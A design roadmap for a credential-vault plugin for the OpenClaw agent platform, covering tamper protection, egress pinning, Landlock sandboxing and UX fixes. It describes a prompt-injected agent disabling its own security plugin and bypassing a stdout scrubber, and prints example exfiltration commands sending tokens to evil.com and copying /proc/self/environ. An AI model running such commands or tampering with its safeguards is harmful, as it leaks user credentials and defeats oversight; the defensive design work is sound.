# Future Work

Items collected from real-world usage testing and security review. Prioritized by impact.

---

## Security Enhancements

### 0. Plugin Tamper Protection (HIGH PRIORITY)

**Problem:** OpenClaw plugins are installed under the same OS user that the agent runs as (`~/.openclaw/plugins/` or a dev path). This means a prompt-injected LLM can use `write`/`edit` tools to modify the vault plugin's source code, compiled output, or configuration — effectively disabling all security protections (scrubbing, injection rules, audit logging) from the inside.

This is especially dangerous for the credential vault because **the plugin IS the security boundary**. Unlike other plugins where tampering degrades functionality, tampering with the vault plugin removes credential protection entirely.

**Proposed solution: Root-owned plugin files + integrity verification on load**

**Part 1 — Root-owned installation:**
- `vault-setup.sh` already makes the resolver binary and `/var/lib/openclaw-vault/` root-owned. Extend this to the plugin's `dist/` directory.
- Plugin JS files owned by root, read-only for the agent user (mode 644, owner root).
- The agent can read/execute the plugin but cannot modify it.
- `tools.yaml` and `~/.openclaw/vault/*.enc` remain agent-writable (needed for vault add/rotate/remove).

**Part 2 — Integrity check on load:**
- At build time, compute SHA-256 hashes of all `dist/*.js` files and store in a signed manifest (`dist/.integrity.json`).
- On plugin load, the gateway verifies each file's hash against the manifest before executing.
- Any mismatch = refuse to load the plugin + prominent warning.
- The manifest itself should be root-owned (or signed with a key the agent doesn't have access to).

**What this protects against:**
- LLM modifying `dist/index.js` to remove scrubbing
- LLM modifying `src/index.ts` and running `npm run build`
- LLM weakening injection rules by editing compiled output
- LLM disabling audit logging

**What this doesn't protect against:**
- LLM modifying `tools.yaml` to weaken injection rules (by design — vault CLI needs write access)
- LLM modifying `~/.openclaw/vault/*.enc` files (encrypted, but could be deleted)
- Root compromise (out of scope for all user-space protections)

**Implementation:** Extend `vault-setup.sh` to chown plugin dist files to root. Add hash verification to plugin init. Minimal code change, high security impact.

---

### ~~0.5. System Vault Cleanup on `vault remove`~~ — RESOLVED (commit 290cf09)

Fixed by routing sync and remove operations through the setuid resolver binary. The resolver now supports `sync`, `remove`, and `sync-meta` actions. Files are created with mode 0600. See commit `bca95e5` for the permissions fix.

---

### 1. Command-level egress pinning for API credentials
**Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).

**Proposed design:** Add an optional `allowedEgress` field to tool config:
```yaml
github:
  match: "gh *"
  env: GITHUB_TOKEN
  allowedEgress: ["github.com", "api.github.com"]
```

Before injecting, scan the command string for URLs and hostnames. If any URL doesn't match the allowed egress list, refuse to inject and log the blocked attempt to the audit log.

**Limitations (document honestly):**
- Obfuscated URLs, variable indirection, and DNS rebinding would bypass this
- Only inspects the command string, not what the subprocess actually does at the network level
- Defense-in-depth measure that raises the bar, not a complete solution

**Complements:** This extends the domain pinning concept from browser credentials to API credentials, using the same philosophy — check before resolving, not after.

---

### 2. Session-Aware Credential Routing

**Problem:** When multiple credentials exist for the same service (e.g., `github` for a bot account and `github-karan` for the owner's personal account), the vault has no way to select which one to inject based on the current session or topic. All injection is purely pattern-based (`commandMatch`).

**Use case:** In a Telegram forum group with multiple topics, the user wants:
- Topic "OpenClaw Contributor" → inject `github-karan` (personal PAT) for `gh *` commands
- All other topics → inject `github` (bot token) for `gh *` commands

**Proposed design:** Add optional `sessionMatch` and `topicMatch` fields to injection rules in `tools.yaml`:
```yaml
github-karan:
  injection:
    type: exec-env
    envVar: GH_TOKEN
    commandMatch: "gh *|git *"
    sessionMatch: "topic:449"  # matches session key containing this substring
    priority: 10               # higher priority = preferred when both match

github:
  injection:
    type: exec-env
    envVar: GH_TOKEN
    commandMatch: "gh *|git *"
    # no sessionMatch = fallback default
    priority: 1
```

**How it works:**
- `before_tool_call` hook already receives session context (channelId, and after PR #33914, groupId)
- When multiple credentials match the same `commandMatch`, the vault selects by:
  1. Filter by `sessionMatch` / `topicMatch` if present
  2. Among remaining matches, pick highest `priority`
  3. If tied, pick the most specific `sessionMatch`
- Credentials with no `sessionMatch` act as fallbacks

**Implementation:** ~50-100 lines in the matching logic. The hook context already has the session information; we just need to thread it into `findMatchingRules()`.

**Why this matters:** This is something native OpenClaw Secrets fundamentally cannot do — it resolves credentials at startup, not at tool-call time. Per-session credential routing requires hook-time decision-making, which is the vault's core architecture.

---

## UX Improvements

### 1. Fuzzy match on tool name not found
**Trigger:** `openclaw vault remove gumroad-password` → "not found"
**Current behavior:** Hard fail with no help.
**Desired behavior:** Show fuzzy matches — "Did you mean one of these?"
```
Tool "gumroad-password" not found. Similar tools in vault:
  - gumroad-login
  - gumroad-api
  - gumroad-session
```
**Applies to:** All commands that take a tool name (`show`, `remove`, `rotate`, `test`, `logs --tool`)

### 2. `vault logs --last N` should accept a count
**Trigger:** `openclaw vault logs --last 5` to see last 5 entries
**Current behavior:** `--last` only accepts a duration string (e.g. `24h`, `7d`, `30m`).
**Desired behavior:** Also accept a plain number — `--last 10` shows the 10 most recent log entries regardless of time.

---

---

### Kernel-Level Filesystem Write Restriction for Vault-Injected Commands

**Problem:** The Perl stdout scrubber catches credentials in subprocess output, but a malicious LLM can bypass it by writing credentials to a file first (`> /tmp/file`, `python3 -c "open(...).write(...)"`, `curl -o file`, `cp /proc/self/environ /tmp/`). Shell-level detection (blocking `>`, `>>`, `tee`) is a cat-and-mouse game — any scripting language or binary can write to disk.

**Proposed solution: Linux Landlock** (kernel 5.13+, ~2021)
- Kernel-level per-process filesystem access control, no root needed
- A small Rust wrapper binary enables Landlock rules before exec'ing the actual command
- Rules: read-only filesystem access, no file create/write
- stdout/stderr/pipes unaffected (not filesystem writes)
- Network unaffected (Landlock v1-3 don't restrict network)

**What this blocks — comprehensively:**
- Shell redirects (`>`, `>>`)
- Scripting language file writes (`python3 -c "open('/tmp/f','w')..."`)
- Binary flags (`curl -o file`)
- Proc filesystem copies (`cp /proc/self/environ /tmp/`)
- Any future creative file-based bypass

**What this doesn't block (separate threat class):**
- Network exfiltration (`curl evil.com -d $SECRET`) — requires egress pinning (see separate future work item)

**Configuration:** Default enabled for vault-injected commands, per-tool override (`allowFileWrite: true` in tools.yaml) for commands that legitimately need to write to disk (e.g., `git commit`, build tools). Most credential-using commands are read-only operations (`gh api`, `curl` without `-o`, `git push`).

**Implementation:** Could be a second small Rust binary (`openclaw-vault-sandbox`) or a mode flag on the existing resolver. We already ship a Rust binary and have the toolchain.

**Interim mitigation (current):** Perl stdout scrubber + `message_sending` hook + `tool_result_persist` hook provide layered defense. File redirect bypass requires a deliberate multi-step attack (write to file, then read it back in a separate command).

---

*More items will be added as testing continues.*

### Alpine Install Verification

Alpine is excluded from install verification because openclaw itself doesn't install cleanly on Alpine — `node-llama-cpp` postinstall requires cmake/xpm which aren't available, and `--ignore-scripts` breaks `openclaw plugins install` (needs python3 subprocess). The vault plugin itself is platform-independent (pure JS + prebuilt argon2 binaries for musl), so this only blocks testing the binary resolver on Alpine.

**Unblock when:** openclaw publishes Alpine-compatible builds or provides a `--no-llama` install flag.

### Install Verification Runtime Optimization (Option 1)

**Current state:** On karan-claw (3.8GB RAM, no swap by default), `openclaw plugins install` in Docker can get OOM-killed during plugin dependency install.

**Current mitigation (Option 2):** pre-install heavy deps in the base image and enable swap on host.

**Future plan (Option 1, when host resources are increased):**
- Increase Docker memory allocation / host RAM (or add permanent swap)
- Remove dependency pre-install workaround from Dockerfiles
- Let install verification run against a leaner, closer-to-user base image

This keeps install verification realistic while reducing environment-specific workarounds.

### Replace Perl Stdout Scrubber with Node.js

**Problem:** The real-time pipe scrubber uses `perl -pe` to regex-replace credentials in subprocess stdout. Perl is pre-installed on most Linux distros and macOS but missing on Alpine by default. This is an external dependency we don't control.

**Proposed solution:** Ship a small Node.js script (`vault-scrub.mjs`) with the plugin that does the same pipe substitution. Node is already a hard dependency, so this eliminates the Perl requirement entirely.

```javascript
// vault-scrub.mjs
import { createInterface } from "readline";
const pairs = JSON.parse(process.argv[1]);
const rl = createInterface({ input: process.stdin });
rl.on("line", (l) => {
  for (const [k, v] of pairs) l = l.replaceAll(k, v);
  process.stdout.write(l + "\n");
});
```

**Tradeoff:** Node process startup (~50ms) vs Perl startup (~5ms). Acceptable since the scrubber runs once per exec call, and the subprocess itself takes much longer.

**Current mitigation:** `vault-setup.sh` auto-installs Perl on Debian/Ubuntu/Alpine/RHEL. The `install.sh` script warns if Perl is missing.

## --use without --yes: prompt for missing fields?
Currently `--use` without `--yes` still errors on missing fields instead of prompting. This makes `--yes` redundant for the `--use` path — if you have all the fields, it works with or without `--yes`. Consider: `--use` without `--yes` could prompt for missing sub-fields (e.g., `--use api` without `--url` → prompt for URL). `--yes` would then mean "don't prompt, error if incomplete." This would make `--use` a hybrid path: skip the menu but still get help filling in details.

## commandMatch should support matching command name mid-string
Currently `commandMatch` generated from `commandName` uses `<name>*` (prefix glob). This misses cases where the command appears mid-string (e.g., piped commands like `echo foo | gh auth status`, or full paths like `/usr/bin/gh`). Consider generating `*<name>*` or supporting multiple patterns.
